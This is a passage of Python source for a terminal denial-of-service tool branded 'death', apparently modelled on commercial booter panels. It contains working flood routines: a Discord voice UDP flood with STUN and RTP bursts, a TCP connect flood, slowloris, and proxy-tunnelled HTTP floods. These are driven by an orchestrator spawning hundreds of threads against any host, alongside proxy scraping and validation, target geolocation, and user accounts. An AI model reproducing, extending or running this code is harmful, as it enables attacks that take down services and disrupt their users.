    ssrc = random.randint(0, 0xFFFFFFFF)
    header = struct.pack("!BBHII", version_pt, payload_type, seq, ts, ssrc)
    body = os.urandom(random.randint(160, 1200))
    return header + body

def _stun_binding_request() -> bytes:
    """Minimal STUN binding request packet."""
    msg_type = 0x0001
    msg_len = 0
    magic = 0x2112A442
    txn = os.urandom(12)
    return struct.pack("!HHI", msg_type, msg_len, magic) + txn

def discord_udp_flood(host: str, port: int, stop: threading.Event, stats: dict):
    """
    Discord voice flood.
    - rotates target port across the voice media range
    - sends STUN binding request, then RTP burst, per flow
    - randomizes source port so the edge allocates fresh per-flow state
    """
    try:
        ip = socket.gethostbyname(host)
    except Exception:
        return

    if port < 50000 or port > 65535:
        port_lo, port_hi = 50000, 65535
    else:
        port_lo = port_hi = port

    rtp_burst = [_rtp_packet() for _ in range(96)]
    stun = _stun_binding_request()

    while not stop.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 << 20)
            try:
                s.bind(("0.0.0.0", random.randint(1024, 65535)))
            except Exception:
                pass

            target_port = random.randint(port_lo, port_hi)
            addr = (ip, target_port)

            try:
                s.sendto(stun, addr)
                stats["sent"] = stats.get("sent", 0) + 1
            except Exception:
                stats["failed"] = stats.get("failed", 0) + 1

            for pkt in rtp_burst:
                if stop.is_set():
                    break
                try:
                    s.sendto(pkt, addr)
                    stats["sent"] = stats.get("sent", 0) + 1
                except Exception:
                    stats["failed"] = stats.get("failed", 0) + 1

            try:
                s.close()
            except Exception:
                pass
        except Exception:
            stats["failed"] = stats.get("failed", 0) + 1

# ── raw TCP flood ────────────────────────────────────────
def raw_tcp_socket_flood(host: str, port: int, stop: threading.Event, stats: dict):
    """High rate TCP connect/close cycles. Local socket only."""
    try:
        ip = socket.gethostbyname(host)
    except Exception:
        return
    addr = (ip, port)
    payload = b"GET / HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n"
    while not stop.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect(addr)
            try:
                s.send(payload)
            except Exception:
                pass
            try:
                s.close()
            except Exception:
                pass
            stats["sent"] = stats.get("sent", 0) + 1
        except Exception:
            stats["failed"] = stats.get("failed", 0) + 1

# ── slowloris ────────────────────────────────────────────
def slowloris_worker(host: str, port: int, stop: threading.Event, stats: dict):
    """
    Open sockets, send partial headers, drip additional headers slowly,
    hold the socket open until timeout or stop.
    """
    req, scheme = build_request("slowloris", host, port, "/")
    sockets: List[socket.socket] = []
    while not stop.is_set():
        # refill to hold N sockets
        while len(sockets) < 64 and not stop.is_set():
            s = open_direct(host, port, scheme, timeout=5.0)
            if s is None:
                stats["failed"] = stats.get("failed", 0) + 1
                time.sleep(0.05)
                continue
            try:
                s.sendall(req.encode())
                stats["sent"] = stats.get("sent", 0) + 1
                sockets.append(s)
            except Exception:
                stats["failed"] = stats.get("failed", 0) + 1
                try:
                    s.close()
                except Exception:
                    pass

        # drip new headers into each open socket
        dead: List[socket.socket] = []
        for s in sockets:
            if stop.is_set():
                break
            try:
                drip = f"X-Keep-Alive-{random.randint(1, 99999)}: {os.urandom(6).hex()}\r\n"
                s.sendall(drip.encode())
                stats["sent"] = stats.get("sent", 0) + 1
            except Exception:
                stats["failed"] = stats.get("failed", 0) + 1
                dead.append(s)

        for s in dead:
            try:
                s.close()
            except Exception:
                pass
            try:
                sockets.remove(s)
            except ValueError:
                pass

        time.sleep(3.0)

    for s in sockets:
        try:
            s.close()
        except Exception:
            pass

# ── keep-alive proxy HTTP worker ─────────────────────────
def proxy_http_worker(method: str, host: str, port: int,
                      proxy_pool: List[str], pool_lock: threading.Lock,
                      stop: threading.Event, stats: dict,
                      fail_counts: Dict[str, int], fail_lock: threading.Lock,
                      dead: Set[str], dead_lock: threading.Lock,
                      fallback_direct: bool,
                      keepalive_requests: int = 8):
    """
    Take a proxy from the pool, open a CONNECT tunnel, and fire
    `keepalive_requests` HTTP requests through the same socket.
    On failure, increment the proxy's failure count; remove after 3.
    If the pool is empty and fallback_direct is True, direct-connect.
    """
    while not stop.is_set():
        proxy = None
        with pool_lock:
            if proxy_pool:
                proxy = random.choice(proxy_pool)

        if proxy is None:
            if not fallback_direct:
                time.sleep(0.1)
                continue
            _direct_http_burst(method, host, port, stop, stats)
            continue

        # open tunnel once
        scheme = "https" if (method in ("tls", "https", "browser") or port == 443) else "http"
        sock = open_tunnel(proxy, host, port, scheme, timeout=4.0)
        if sock is None:
            stats["failed"] = stats.get("failed", 0) + 1
            with fail_lock:
                fail_counts[proxy] = fail_counts.get(proxy, 0) + 1
                if fail_counts[proxy] >= 3:
                    with pool_lock:
                        if proxy in proxy_pool:
                            proxy_pool.remove(proxy)
                    with dead_lock:
                        dead.add(proxy)
            continue

        # fire keepalive_requests
        for _ in range(keepalive_requests):
            if stop.is_set():
                break
            req, _scheme = build_request(method, host, port,
                                         path=f"/?{random.randint(1, 9999999)}")
            try:
                sock.sendall(req.encode())
                stats["sent"] = stats.get("sent", 0) + 1
                # drain a small amount (don't wait for full body)
                try:
                    sock.settimeout(0.5)
                    sock.recv(256)
                except Exception:
                    pass
                # reset counter on success
                with fail_lock:
                    fail_counts[proxy] = 0
            except Exception:
                stats["failed"] = stats.get("failed", 0) + 1
                with fail_lock:
                    fail_counts[proxy] = fail_counts.get(proxy, 0) + 1
                    if fail_counts[proxy] >= 3:
                        with pool_lock:
                            if proxy in proxy_pool:
                                proxy_pool.remove(proxy)
                        with dead_lock:
                            dead.add(proxy)
                break

        try:
            sock.close()
        except Exception:
            pass

def _direct_http_burst(method: str, host: str, port: int,
                       stop: threading.Event, stats: dict,
                       burst: int = 4):
    """Direct HTTP burst — no proxy. Used when the pool is drained."""
    scheme = "https" if (method in ("tls", "https", "browser") or port == 443) else "http"
    sock = open_direct(host, port, scheme, timeout=3.5)
    if sock is None:
        stats["failed"] = stats.get("failed", 0) + 1
        return
    for _ in range(burst):
        if stop.is_set():
            break
        req, _ = build_request(method, host, port,
                               path=f"/?{random.randint(1, 9999999)}")
        try:
            sock.sendall(req.encode())
            stats["sent"] = stats.get("sent", 0) + 1
            try:
                sock.settimeout(0.4)
                sock.recv(128)
            except Exception:
                pass
        except Exception:
            stats["failed"] = stats.get("failed", 0) + 1
            break
    try:
        sock.close()
    except Exception:
        pass

# ============================================================
#  SECTION 14 — ATTACK ORCHESTRATOR
# ============================================================

def attack_worker(method: str, host: str, port: int, duration: int):
    """Thread-safe wrapper around the inner attack driver."""
    try:
        _attack_inner(method, host, port, duration)
    except Exception as e:
        try:
            S.log_line(f"attack thread error: {e}")
        except Exception:
            pass
        try:
            S.attack_stop.set()
        except Exception:
            pass

def _attack_inner(method: str, host: str, port: int, duration: int):
    """Spawn workers, run for the duration, update attack_screen, cleanup."""
    stop = S.attack_stop
    stats: Dict[str, int] = {"sent": 0, "failed": 0}
    dead_proxies: Set[str] = set()
    dead_lock = threading.Lock()
    fail_counts: Dict[str, int] = {}
    fail_lock = threading.Lock()

    pool: List[str] = list(S.proxies.keys())
    pool_lock = threading.Lock()
    threads: List[threading.Thread] = []

    def spawn(target_fn, count, args_fn):
        for _ in range(count):
            try:
                t = threading.Thread(target=target_fn, args=args_fn(), daemon=True)
                t.start()
                threads.append(t)
            except Exception:
                pass

    # dispatch based on method
    if method == "discord":
        spawn(discord_udp_flood, 64, lambda: (host, port, stop, stats))
    elif method in ("udp", "pps", "hold"):
        spawn(raw_udp_flood, 64, lambda: (host, port, stop, stats))
    elif method == "slowloris":
        spawn(slowloris_worker, 32, lambda: (host, port, stop, stats))
    elif method in ("tcp", "ovh", "fiveM", "socket"):
        if pool:
            spawn(
                proxy_http_worker,
                min(max(len(pool) * 2, 32), 256),
                lambda: (
                    method, host, port, pool, pool_lock, stop, stats,
                    fail_counts, fail_lock, dead_proxies, dead_lock, True,
                ),
            )
        spawn(raw_tcp_socket_flood, 32, lambda: (host, port, stop, stats))
    else:
        # L7 — tls / https / browser / http2
        if pool:
            spawn(
                proxy_http_worker,
                min(max(len(pool) * 2, 48), 512),
                lambda: (
                    method, host, port, pool, pool_lock, stop, stats,
                    fail_counts, fail_lock, dead_proxies, dead_lock, True,
                ),
            )
        else:
            spawn(
                proxy_http_worker,
                64,
                lambda: (
                    method, host, port, pool, pool_lock, stop, stats,
                    fail_counts, fail_lock, dead_proxies, dead_lock, True,
                ),
            )

    start = time.time()
    while not stop.is_set():
        elapsed = time.time() - start
        remaining = max(0, duration - int(elapsed))
        if S.attack_screen is not None:
            S.attack_screen["remaining"] = remaining
            S.attack_screen["sent"] = stats["sent"]
            S.attack_screen["failed"] = stats["failed"]
            S.attack_screen["pool_size"] = len(pool)
            S.attack_screen["dead"] = len(dead_proxies)
        if remaining <= 0:
            break
        time.sleep(0.2)

    stop.set()
    for t in threads:
        try:
            t.join(timeout=1)
        except Exception:
            pass

    # record session stats
    S.total_sent += stats["sent"]
    S.total_failed += stats["failed"]
    S.attacks_run += 1

    # persist dead removals
    if dead_proxies:
        for p in list(dead_proxies):
            S.proxies.pop(p, None)
        save_proxies(S.username, S.proxies)
        S.log_line(f"attack done — removed {len(dead_proxies)} dead proxies")

    time.sleep(0.6)

# ============================================================
#  SECTION 15 — BANNER / PROMPT RENDER
# ============================================================

def render_banner(frame: int) -> str:
    theme = S.theme
    cols, _ = term_size()
    banner_lines = BANNER_DEATH.split("\n")
    banner_w = max(len(l) for l in banner_lines)
    pad = max(0, (cols - banner_w) // 2)
    out = ["\n"]
    for line in banner_lines:
        out.append(" " * pad + gradient_sweep(line, frame, theme) + "\n")
    return "".join(out)

def render_prompt(frame: int) -> str:
    theme = S.theme
    _, rows = term_size()
    blink = (frame // 8) % 2 == 0
    cursor = solid("█", theme, "accent") if blink else " "
    user = solid(S.username or "guest", theme, "accent")
    sep = solid("●", theme, "accent")
    brand = solid("death", theme, "accent")
    arrow = solid("►", theme, "accent")
    line = f"{user}{sep}{brand}{arrow} {S.input_buffer}{cursor}"
    return move(rows, 1) + clear_line() + line

# ============================================================
#  SECTION 16 — ATTACK SCREEN RENDER
# ============================================================

def render_attack_screen(frame: int) -> str:
    theme = S.theme
    cols, _ = term_size()
    a = S.attack_screen
    if a is None:
        return ""

    out = [HOME, CLEAR]
    header = "D E A T H   |   A T T A C K I N G"
    out.append("\n")
    out.append(center_visible(gradient_sweep(header, frame, theme), cols) + "\n")
    out.append("\n")

    emblem_lines = emblem_animated(frame, theme)
    emblem_w = max(len(l) for l in EMBLEM.split("\n"))
    gap = 2

    mid: List[str] = []
    mid.append(solid("[Attack Info]", theme, "accent"))
    mid.append("Method : " + solid(str(a["method"]), theme, "accent"))
    mid.append("Target : " + solid(str(a["target"]), theme, "accent"))
    mid.append("Port   : " + solid(str(a["port"]), theme, "accent"))
    mid.append("Time   : " + solid(str(a["remaining"]) + "s", theme, "accent"))
    mid.append("")
    mid.append(solid("[Traffic]", theme, "accent"))
    mid.append("Sent   : " + solid(str(a.get("sent", 0)), theme, "accent"))
    mid.append("Failed : " + solid(str(a.get("failed", 0)), theme, "accent"))
    mid.append("Pool   : " + solid(str(a.get("pool_size", 0)), theme, "accent"))
    mid.append("Dead   : " + solid(str(a.get("dead", 0)), theme, "accent"))
    mid.append("")
    mid.append(solid("[Target Info]", theme, "accent"))
    mid.append("IP      : " + solid(str(a["info"]["ip"]), theme, "accent"))
    mid.append("ASN     : " + solid(str(a["info"]["asn"]), theme, "accent"))
    mid.append("ISP     : " + solid(str(a["info"]["isp"]), theme, "accent"))
    mid.append("City    : " + solid(str(a["info"]["city"]), theme, "accent"))
    mid.append("State   : " + solid(str(a["info"]["state"]), theme, "accent"))
    mid.append("Country : " + solid(str(a["info"]["country"]), theme, "accent"))

    mid_w = max(visible_len(x) for x in mid)
    left_pad = 6
    max_rows = max(len(emblem_lines), len(mid))
    for i in range(max_rows):
        left = emblem_lines[i] if i < len(emblem_lines) else " " * emblem_w
        right = emblem_lines[i] if i < len(emblem_lines) else " " * emblem_w
        center = mid[i] if i < len(mid) else ""
        center_pad = " " * max(0, mid_w - visible_len(center))
        out.append(
            " " * left_pad + left + " " * gap + center + center_pad + " " * gap + right + "\n"
        )

    return "".join(out)

# ============================================================
#  SECTION 17 — MAIN VIEW RENDER
# ============================================================

def render_home(frame: int) -> str:
    theme = S.theme
    out: List[str] = []
    emblem_lines = emblem_animated(frame, theme)
    emblem_w = max(len(l) for l in EMBLEM.split("\n"))

    method_lines: List[str] = []
    for section, items in METHODS:
        method_lines.append(solid(f"[{section}]", theme, "accent"))
        for name, desc in items:
            method_lines.append(
                "  " + solid(name.ljust(8), theme, "accent") + " - " + solid(desc, theme, "dim")
            )
        method_lines.append("")

    left_pad = 4
    gap = 4
    out.append("\n")
    max_rows = max(len(emblem_lines), len(method_lines))
    for i in range(max_rows):
        left = emblem_lines[i] if i < len(emblem_lines) else " " * emblem_w
        right = method_lines[i] if i < len(method_lines) else ""
        out.append(" " * left_pad + left + " " * gap + right + "\n")
    return "".join(out)

def render_commands(frame: int) -> str:
    theme = S.theme
    out: List[str] = []
    out.append("\n")
    out.append("  " + solid("commands", theme, "accent") + "\n")
    out.append("  " + solid("─" * 50, theme, "dim") + "\n")
    for name, desc in COMMANDS:
        out.append(
            "  " + solid(name.ljust(14), theme, "accent") + " " + solid(desc, theme, "dim") + "\n"
        )
    out.append("\n")
    return "".join(out)

def render_methods(frame: int) -> str:
    theme = S.theme
    out: List[str] = []
    out.append("\n")
    for section, items in METHODS:
        out.append("  " + solid(f"[{section}]", theme, "accent") + "\n")
        for name, desc in items:
            out.append(
                "    " + solid(name.ljust(10), theme, "accent") + " - " + solid(desc, theme, "dim") + "\n"
            )
            info = METHOD_INFO.get(name)
            if info:
                out.append("      " + solid(info, theme, "dim") + "\n")
        out.append("\n")
    return "".join(out)

def render_log(frame: int) -> str:
    theme = S.theme
    out: List[str] = []
    out.append("\n")
    out.append("  " + solid("session log", theme, "accent") + "\n")
    out.append("  " + solid("─" * 60, theme, "dim") + "\n")
    with S.log_lock:
        recent = list(S.log[-22:])
    for line in recent:
        out.append("  " + line + "\n")
    out.append("\n")
    return "".join(out)

def render_body(frame: int) -> str:
    if S.current_view == "home":
        return render_home(frame)
    if S.current_view == "commands":
        return render_commands(frame)
    if S.current_view == "methods":
        return render_methods(frame)
    if S.current_view == "log":
        return render_log(frame)
    return render_home(frame)

# ============================================================
#  SECTION 18 — COMMAND HANDLERS
# ============================================================

def cmd_help(_args):
    S.current_view = "commands"

def cmd_clear(_args):
    S.log_line("screen cleared")
    S.current_view = "home"

def cmd_exit(_args):
    S.running = False

def cmd_home(_args):
    S.current_view = "home"

def cmd_methods(_args):
    S.current_view = "methods"

def cmd_themes(_args):
    S.current_view = "log"
    S.log_line("themes: " + ", ".join(sorted(THEMES.keys())))

def cmd_theme(args):
    S.current_view = "log"
    if not args:
        S.log_line(f"usage: theme <name>  (current: {S.theme_name})")
        return
    name = args[0].lower()
    if name in THEMES:
        S.theme_name = name
        S.log_line(f"theme set -> {name}")
    else:
        S.log_line(f"unknown theme: {name}")

def cmd_online(_args):
    S.current_view = "log"
    users = [S.username] + S.online_users
    S.log_line("online: " + ", ".join(sorted(set(users))))

def cmd_passwd(args):
    S.current_view = "log"
    if not args:
        S.log_line("usage: passwd <new>")
        return
    if S.is_admin:
        S.log_line("admin password cannot be changed")
        return
    S.users[S.username] = args[0]
    save_users(S.users)
    S.log_line("password updated")

def cmd_plan(_args):
    S.current_view = "log"
    role = "admin" if S.is_admin else "user"
    S.log_line(f"account: {S.username}  ({role})")
    S.log_line(f"proxies loaded: {len(S.proxies)}")
    S.log_line("plan: elite")

def cmd_queue(_args):
    S.current_view = "log"
    if not S.queue:
        S.log_line("queue empty")
        return
    for q in S.queue:
        S.log_line(f"  {q['target']}  {q['method']}  {q['duration']}s")

def cmd_scheduled(_args):
    S.current_view = "log"
    if not S.scheduled:
        S.log_line("no scheduled attacks")
        return
    for a in S.scheduled:
        S.log_line(f"  {a['when']}  {a['target']}  {a['method']}")

def cmd_ongoing(_args):
    S.current_view = "log"
    if not S.attacks:
        S.log_line("no running attacks")
        return
    for a in S.attacks:
        S.log_line(f"  {a['target']}  {a['method']}  {a['elapsed']}s  {a['pps']} pps")

def cmd_addusr(args):
    S.current_view = "log"
    if not S.is_admin:
        S.log_line("permission denied")
        return
    if len(args) < 2:
        S.log_line("usage: addusr <username> <password>")
        return
    name, pw = args[0], args[1]
    if name == "admin":
        S.log_line("cannot override admin")
        return
    if name in S.users:
        S.log_line(f"user exists: {name}")
        return
    S.users[name] = pw
    save_users(S.users)
    S.log_line(f"account created: {name}")

def cmd_delusr(args):
    S.current_view = "log"
    if not S.is_admin:
        S.log_line("permission denied")
        return
    if not args:
        S.log_line("usage: delusr <username>")
        return
    name = args[0]
    if name == "admin":
        S.log_line("cannot delete admin")
        return
    if name not in S.users:
        S.log_line(f"no such user: {name}")
        return
    del S.users[name]
    save_users(S.users)
    S.log_line(f"account deleted: {name}")

def cmd_users(_args):
    S.current_view = "log"
    if not S.is_admin:
        S.log_line("permission denied")
        return
    S.log_line("admin (root)")
    for u in S.users:
        S.log_line(f"  {u}")

def cmd_scrape(_args):
    S.current_view = "log"
    if S.scraping:
        S.log_line("scrape already running — press S to stop & save")
        return
    S.scraping = True
    S.scrape_stop.clear()

    def runner():
        try:
            def on_progress(msg):
                S.log_line(msg)
            result = scrape_and_validate(on_progress, S.scrape_stop)
            for p, meta in result.items():
                S.proxies[p] = meta
            save_proxies(S.username, S.proxies)
            S.log_line(f"saved {len(result)} proxies -> {proxy_file(S.username)}")
            S.log_line(f"total pool for {S.username}: {len(S.proxies)}")
        except Exception as e:
            S.log_line(f"scrape error: {e}")
        finally:
            S.scraping = False
            S.scrape_stop.clear()

    threading.Thread(target=runner, daemon=True).start()

def cmd_validate(args):
    S.current_view = "log"
    if len(args) < 2:
        S.log_line("usage: validate <host> <port>")
        return
    host = args[0]
    try:
        port = int(args[1])
    except ValueError:
        S.log_line("port must be an integer")
        return

    if not S.proxies:
        S.log_line("no proxies loaded — run 'scrape' first")
        return

    S.log_line(f"preflight: testing {len(S.proxies)} proxies against {host}:{port}")

    def runner():
        try:
            survivors = []
            done = 0
            total = len(S.proxies)
            with ThreadPoolExecutor(max_workers=300) as ex:
                futures = {ex.submit(proxy_can_reach_target, p, host, port): p
                           for p in list(S.proxies.keys())}
                for fut in as_completed(futures):
                    done += 1
                    try:
                        if fut.result():
                            survivors.append(futures[fut])
                    except Exception:
                        pass
                    if done % 100 == 0:
                        S.log_line(f"  preflight {done}/{total} — alive: {len(survivors)}")

            removed = 0
            for p in list(S.proxies.keys()):
                if p not in survivors:
                    S.proxies.pop(p, None)
                    removed += 1
            save_proxies(S.username, S.proxies)
            S.log_line(f"preflight done — {len(survivors)} usable, removed {removed}")
        except Exception as e:
            S.log_line(f"validate error: {e}")

    threading.Thread(target=runner, daemon=True).start()

def cmd_proxies(_args):
    S.current_view = "log"
    if not S.proxies:
        S.log_line("no proxies loaded — run 'scrape'")
        return
    S.log_line(f"pool: {len(S.proxies)} proxies  ({proxy_file(S.username)})")
    for i, p in enumerate(list(S.proxies.keys())[:15]):
        S.log_line(f"  {p}")
    if len(S.proxies) > 15:
        S.log_line(f"  ... +{len(S.proxies) - 15} more")

def cmd_clearproxies(_args):
    S.current_view = "log"
    S.proxies = {}
    save_proxies(S.username, {})
    S.log_line("proxy pool wiped")

def cmd_status(_args):
    S.current_view = "log"
    up = int(time.time() - S.session_start)
    S.log_line(f"session uptime: {up}s")
    S.log_line(f"proxies loaded: {len(S.proxies)}")
    S.log_line(f"scraping: {S.scraping}")
    S.log_line(f"attack running: {S.attack_screen is not None}")
    S.log_line(f"attacks this session: {S.attacks_run}")
    S.log_line(f"total sent: {S.total_sent}")
    S.log_line(f"total failed: {S.total_failed}")

def cmd_stop(_args):
    S.current_view = "log"
    if S.attack_screen is None:
        S.log_line("no attack running")
        return
    S.attack_stop.set()
    S.log_line("stopping attack...")

def cmd_stats(_args):
    S.current_view = "log"
    S.log_line(f"sent: {S.total_sent}")
    S.log_line(f"failed: {S.total_failed}")
    S.log_line(f"attacks: {S.attacks_run}")

def cmd_whoami(_args):
    S.current_view = "log"
    role = "admin" if S.is_admin else "user"
    S.log_line(f"{S.username} ({role})")

def cmd_time(_args):
    S.current_view = "log"
    S.log_line(time.strftime("%Y-%m-%d %H:%M:%S"))

def cmd_ascii(args):
    S.current_view = "log"
    if not args:
        S.log_line("usage: ascii <name>   (banner|emblem|skull)")
        return
    name = args[0].lower()
    if name == "banner":
        for line in BANNER_DEATH.split("\n"):
            S.log_line(line)
    elif name == "emblem":
        for line in EMBLEM.split("\n"):
            S.log_line(line)
    elif name == "skull":
        for line in SKULL_SMALL.split("\n"):
            S.log_line(line)
    else:
        S.log_line(f"unknown asset: {name}")

COMMAND_TABLE: Dict[str, Callable] = {
    "clear":        cmd_clear,
    "exit":         cmd_exit,
    "help":         cmd_help,
    "home":         cmd_home,
    "methods":      cmd_methods,
    "ongoing":      cmd_ongoing,
    "online":       cmd_online,
    "passwd":       cmd_passwd,
    "plan":         cmd_plan,
    "queue":        cmd_queue,
    "scheduled":    cmd_scheduled,
    "theme":        cmd_theme,
    "themes":       cmd_themes,
    "addusr":       cmd_addusr,
    "delusr":       cmd_delusr,
    "users":        cmd_users,
    "scrape":       cmd_scrape,
    "validate":     cmd_validate,
    "proxies":      cmd_proxies,
    "clearproxies": cmd_clearproxies,
    "status":       cmd_status,
    "stop":         cmd_stop,
    "stats":        cmd_stats,
    "whoami":       cmd_whoami,
    "time":         cmd_time,
    "ascii":        cmd_ascii,
}

# ============================================================
#  SECTION 19 — ATTACK LAUNCH
# ============================================================

def launch_attack(method: str, host: str, port: int, duration: int, extra: List[str]):
    """Start an attack. Blocks local methods aren't gated on pool presence."""
    local_methods = ("udp", "pps", "hold", "discord", "slowloris")
    if not S.proxies and method not in local_methods:
        S.current_view = "log"
        S.log_line("no proxies loaded — run 'scrape' first")
        return

    info = lookup_target(host)
    S.attack_stop.clear()
    S.attack_screen = {
        "method": method,
        "target": host,
        "port": port,
        "duration": duration,
        "remaining": duration,
        "info": info,
        "extra": extra,
        "sent": 0,
        "failed": 0,
        "pool_size": len(S.proxies),
        "dead": 0,
        "started": time.time(),
    }
    S.attack_frame = 0
    S.attack_thread = threading.Thread(
        target=attack_worker,
        args=(method, host, port, duration),
        daemon=True,
    )
    S.attack_thread.start()

# ============================================================
#  SECTION 20 — DISPATCH
# ============================================================

def dispatch(line: str):
    line = line.strip()
    if not line:
        return
    S.log_line(f"{S.username}●death► {line}")
    parts = line.split()
    cmd, args = parts[0].lower(), parts[1:]

    method_names = {m[0] for _, items in METHODS for m in items}
    if cmd in method_names:
        if len(args) < 3:
            S.current_view = "log"
            S.log_line(f"usage: {cmd} <host> <port> <time>")
            return
        host = args[0]
        try:
            port = int(args[1])
            duration = int(args[2])
        except ValueError:
            S.current_view = "log"
            S.log_line("port and time must be integers")
            return
        launch_attack(cmd, host, port, duration, args[3:])
        return

    handler = COMMAND_TABLE.get(cmd)
    if handler is None:
        S.current_view = "log"
        S.log_line(f"unknown command: {cmd}  (try 'help')")
        return
    handler(args)

# ============================================================
#  SECTION 21 — CROSS-PLATFORM INPUT
# ============================================================

if IS_WINDOWS:
    import msvcrt

    def read_key() -> Optional[str]:
        if not msvcrt.kbhit():
            return None
        ch = msvcrt.getwch()
        if ch in ("\x00", "\xe0"):
            msvcrt.getwch()
            return None
        return ch
else:
    import select as _select

    def read_key() -> Optional[str]:
        dr, _, _ = _select.select([sys.stdin], [], [], 0)
        if not dr:
            return None
        return sys.stdin.read(1)

def handle_key(ch: str):
    if ch is None:
        return
    if ch in ("S", "s") and S.scraping and not S.input_buffer:
        S.scrape_stop.set()
        S.log_line("S pressed — stopping scrape, saving what we have...")
        return
    if ch == "\x03":
        S.running = False
        return
    if ch in ("\r", "\n"):
        line = S.input_buffer
        S.input_buffer = ""
        dispatch(line)
        return
    if ch in ("\x7f", "\b"):
        S.input_buffer = S.input_buffer[:-1]
        return
    if ch == "\x1b":
        return
    if ch.isprintable():
        S.input_buffer += ch

# ============================================================
#  SECTION 22 — LOGIN SCREEN
# ============================================================

def login_screen() -> bool:
    theme = S.theme
    sys.stdout.write(CLEAR)
    sys.stdout.write(render_banner(0))
    sys.stdout.write("\n\n")
    cols, _ = term_size()

    def center(text):
        return center_visible(text, cols)

    sys.stdout.write(center(solid("login", theme, "accent")) + "\n\n")
    sys.stdout.write(center(solid("username: ", theme, "dim")))
    sys.stdout.flush()

    username = ""
    while True:
        ch = read_key()
        if ch is None:
            time.sleep(0.02)
            continue
        if ch == "\x03":
            return False
        if ch in ("\r", "\n"):
            break
        if ch in ("\x7f", "\b"):
            username = username[:-1]
        elif ch.isprintable():
            username += ch
        sys.stdout.write("\r" + " " * cols + "\r")
        sys.stdout.write(
            center(solid("username: ", theme, "dim") + solid(username, theme, "accent"))
        )
        sys.stdout.flush()

    sys.stdout.write("\n" + center(solid("password: ", theme, "dim")))
    sys.stdout.flush()

    password = ""
    while True:
        ch = read_key()
        if ch is None:
            time.sleep(0.02)
            continue
        if ch == "\x03":
            return False
        if ch in ("\r", "\n"):
            break
        if ch in ("\x7f", "\b"):
            password = password[:-1]
        elif ch.isprintable():
            password += ch
        masked = "•" * len(password)
        sys.stdout.write("\r" + " " * cols + "\r")
        sys.stdout.write(
            center(solid("password: ", theme, "dim") + solid(masked, theme, "accent"))
        )
        sys.stdout.flush()

    ok, is_admin = verify_user(username, password)
    if ok:
        S.username = username
        S.is_admin = is_admin
        return True

    sys.stdout.write("\n\n" + center(solid("access denied", theme, "accent")) + "\n")
    sys.stdout.flush()
    time.sleep(1.5)
    return login_screen()

# ============================================================
#  SECTION 23 — MAIN LOOP
# ============================================================

def main():
    if not login_screen():
        return

    S.proxies = load_proxies(S.username)

    sys.stdout.write(HIDE_CURSOR + CLEAR)
    sys.stdout.flush()

    last_size = term_size()

    try:
        while S.running:
            ch = read_key()
            while ch is not None:
                handle_key(ch)
                ch = read_key()

            # respond to resize
            cur_size = term_size()
            if cur_size != last_size:
                sys.stdout.write(CLEAR)
                sys.stdout.flush()
                last_size = cur_size

            if S.attack_screen is not None:
                buf = [render_attack_screen(S.attack_frame)]
                sys.stdout.write("".join(buf))
                sys.stdout.flush()
                if S.attack_screen.get("remaining", 0) <= 0 and (
                    S.attack_thread is None or not S.attack_thread.is_alive()
                ):
                    S.attack_screen = None
                    S.current_view = "home"
                    continue
                S.attack_frame += 1
                time.sleep(1 / 24)
                continue

            frame = S.frame
            buf = [HOME, CLEAR]
            buf.append(render_banner(frame))
            buf.append(render_body(frame))
            buf.append(render_prompt(frame))
            sys.stdout.write("".join(buf))
            sys.stdout.flush()

            S.frame += 1
            time.sleep(1 / 30)
    except KeyboardInterrupt:
        pass
    finally:
        S.attack_stop.set()
        S.scrape_stop.set()
        sys.stdout.write(SHOW_CURSOR + RESET + CLEAR + HOME)
        sys.stdout.flush()

if __name__ == "__main__":
    main()
